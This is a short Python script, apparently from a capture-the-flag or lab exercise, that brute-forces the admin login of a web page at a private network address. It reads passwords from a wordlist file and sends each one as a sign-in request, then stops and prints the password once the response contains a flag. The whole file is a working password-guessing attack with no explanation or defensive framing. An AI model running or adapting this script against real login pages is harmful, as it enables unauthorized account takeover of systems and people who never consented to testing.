import requests

URL = "http://192.168.1.41/index.php"

session = requests.Session()

with open("../Resources/passwords.txt") as passwords:
    for password in passwords:
        password = password.strip()

        params = {
            "page": "signin",
            "username": "admin",
            "password": password,
            "Login": "Login"
        }

        response = session.get(URL, params=params)

        # print(f"[+] Trying: {password}")

        # Debug (optional)
        # print(response.url)
        # print(response.text[:200])

        # SUCCESS condition
        if "the flag is" in response.text.lower():
            print(f"\n SUCCESS! Password found: {password}")
            print(response.text)
            break

        else:
            print(f"[-] {password}  Incorrect")